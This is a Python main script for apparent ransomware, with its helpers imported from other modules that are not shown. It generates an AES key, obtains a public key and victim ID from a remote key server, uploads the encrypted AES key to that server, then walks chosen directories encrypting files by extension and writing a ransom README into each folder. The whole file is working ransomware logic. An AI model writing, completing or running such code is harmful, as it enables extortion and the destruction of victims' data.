from common import *
from config import *


def main() -> None:
    key = os.urandom(__AES_KEY_SIZE__ // 8)
    iv = os.urandom(16)

    cipher = create_cipher(key, iv)

    response = generate_public_key(__KEY_URL__)
    public_key = load_public_key(response["public_key"].encode())
    user_id = response["uuid"]

    update_db(__KEY_URL__, user_id, encrypt_key(key, public_key), iv)

    for file in get_dirs_and_files(
        __ROOT_DIRS__, __EXCLUDE_DIRS__, __FILE_EXTS__, __INTEVAL__
    ):
        if os.path.isdir(file):
            write_readme(file, __README_FILE__, __MESSAGE__, user_id)
        else:
            encrypt_file(file, cipher, __AES_KEY_SIZE__, __FILE_ADDITIONAL_EXT__)


if __name__ == "__main__":
    main()
